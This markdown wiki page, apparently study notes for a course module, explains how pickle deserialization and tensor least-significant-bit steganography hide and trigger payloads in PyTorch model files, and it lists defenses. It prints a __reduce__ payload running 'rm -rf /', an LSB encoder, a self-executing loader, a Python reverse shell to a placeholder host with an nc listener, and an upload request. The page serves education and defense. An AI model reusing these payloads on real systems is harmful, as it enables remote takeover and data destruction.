---
tags: [attack, attack/ai]
module: ai_data_attacks
last_updated: 2026-05-10
source_count: 5
---

# Model Steganography and Pickle Exploitation

Hiding executable payloads inside ML model files and triggering them via insecure deserialization.

## Overview

This attack family targets model *storage and loading* rather than training data. An attacker with write access to a model registry (S3 bucket, Hugging Face repo, CI/CD pipeline) can:
1. **Embed a payload** in a model file's parameter tensors (tensor steganography)
2. **Trigger execution** via Python's pickle deserialization when the victim loads the file

The outcome is not wrong predictions — it is **code execution** on the serving infrastructure.

OWASP classification: **LLM05 — Supply Chain Vulnerabilities**.

## The Pickle Vulnerability

Python's `pickle` serializes objects by recording class and state. When deserializing, if an object defines `__reduce__`, pickle calls it to get reconstruction instructions — which can include *any callable*.

```python
class MaliciousClass:
    def __reduce__(self):
        return (exec, ("import os; os.system('rm -rf /')",))
```

`pickle.load()` will blindly call `exec(...)` on deserialization.

### PyTorch's Exposure

`torch.save(obj, path)` uses pickle internally. `torch.load(path)` calls `pickle.load()` — inheriting the full vulnerability.

**Safe mode**: `torch.load(path, weights_only=True)` uses a restricted unpickler that only accepts tensors, dicts, lists, tuples, strings, and numbers. It cannot execute `__reduce__` payloads.

**Vulnerable mode**: `torch.load(path, weights_only=False)` (or older PyTorch where this was the default) — full pickle execution.

## Tensor Steganography

The attack uses the model's weight tensors as a data carrier for the payload, hidden in IEEE 754 least significant bits.

### IEEE 754 Float32 Structure

A `float32` has 32 bits: `[Sign 1bit][Exponent 8bits][Mantissa 23bits]`

```
Value = (-1)^s × (1.m) × 2^(E_stored - 127)
```

The **mantissa LSBs** (bits 0–4 of the 23-bit mantissa) contribute minimally to the value. Flipping bit 0 changes `0.15625` to `0.156250014901161` — a delta of `1.49×10⁻⁸`, well within training noise tolerance. Flipping bit 22 (MSB of mantissa) shifts the value by `0.0625`, which is detectable.

### Capacity Formula

For a tensor with `N` elements using `n` LSBs per float:

```
Capacity_bits = N × n
Capacity_bytes = ⌊(N × n) / 8⌋
```

`SimpleNet.large_layer.weight` (shape `[320, 64]`, numel=20480) with `n=2` LSBs:
```
Capacity = ⌊(20480 × 2) / 8⌋ = 5120 bytes
```

### Encoding (LSB Steganography)

```python
def encode_lsb(tensor_orig, data_bytes, num_lsb):
    # Prepend 4-byte length prefix to data
    data_to_embed = struct.pack(">I", len(data_bytes)) + data_bytes
    tensor = tensor_orig.clone()
    tensor_flat = tensor.flatten()

    for each element:
        packed = struct.pack(">f", float_val)
        int_rep = struct.unpack(">I", packed)[0]
        mask = (1 << num_lsb) - 1
        cleared = int_rep & (~mask)          # zero the LSBs
        new_int = cleared | data_bits        # write payload bits
        new_float = struct.unpack(">f", struct.pack(">I", new_int))[0]
        tensor_flat[element_index] = new_float
```

### Decoding

Reverse: extract `num_lsb` bits per float element, read the 4-byte length prefix first, then reconstruct the payload bytes.

## Full Attack Chain: TrojanModelWrapper

The complete attack packages everything into a single self-contained file:

```
Attacker steps:
1. Train/acquire legitimate model → save state_dict
2. Encode reverse shell payload into large_layer.weight LSBs
3. Wrap modified state_dict in TrojanModelWrapper
4. torch.save(wrapper, "malicious_model.pth")
5. Upload to victim's /upload endpoint

Victim steps (automatic):
1. app receives model file
2. torch.load("malicious_model.pth")  ← triggers __reduce__
3. __reduce__ returns (exec, (loader_code,))
4. loader_code: deserializes state_dict, decodes LSBs, exec()s reverse shell
5. Attacker receives shell on nc -lvnp 4444
```

### The `__reduce__` Trigger

```python
class TrojanModelWrapper:
    def __reduce__(self):
        loader_code = f"""
import pickle, torch, struct, socket, pty, os, sys
# ... decode_lsb function ...
# ... decode payload from tensor ...
exec(extracted_payload_code, globals(), locals())
"""
        return (exec, (loader_code,))
```

The loader code is self-contained: it embeds the pickled state dict as a literal, the decode_lsb logic, and the reverse shell — everything needed for execution travels in a single `.pth` file.

## Reverse Shell Payload

```python
payload = f"""
import socket, pty, os
s = socket.socket()
s.connect(('{HOST_IP}', {PORT}))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
pty.spawn(['/bin/bash'])
"""
payload_bytes = payload.encode('utf-8')  # embed this into tensor LSBs
```

**Listener**: `nc -lvnp 4444`
**Upload**: `requests.post("http://target:5555/upload", files={"model": open("malicious.pth", "rb")})`

## Defenses

| Defense | What it prevents |
|---------|-----------------|
| `torch.load(path, weights_only=True)` | Blocks `__reduce__` execution entirely |
| SHA-256 hash verification before load | Detects any file modification |
| Cryptographic model signing | Ensures provenance |
| Sandboxed model loading environment | Limits blast radius if payload runs |
| Statistical weight anomaly detection | May catch unusual LSB patterns |
| Immutable model registries with access control | Prevents attacker write access |

## Gotchas & Notes

- `weights_only=True` is the default in recent PyTorch versions but many production deployments use older versions or explicitly pass `weights_only=False` for compatibility with complex objects.
- The attack is purely hypothetical unless the attacker has write access to a model storage system — access control is the primary prevention layer.
- Tensor steganography capacity scales with model size. Large LLMs (billions of parameters) can hide megabytes of data.
- The steganographic modification is statistically detectable by examining LSB distributions — a uniform distribution of LSBs is suspicious; legitimate weights tend to have non-uniform LSB patterns.

## Related Pages
- [[attack/ai/data_poisoning]]
- [[attack/ai/trojan_attacks]]
- [[attack/ai/attacking_ai_systems]]
- [[attack/ai/_overview]]

## Sources
- raw/ai_data_attacks/pickels_and_tensor_steganography.md
- raw/ai_data_attacks/pickels_and_steganography_training_simplenet.md
- raw/ai_data_attacks/pickels_and_steganography_steganography_tools.md
- raw/ai_data_attacks/pickels_and_steganography_the_attack.md
- raw/ai_data_attacks/pickels_and_steganography_execute_the_attacks.md
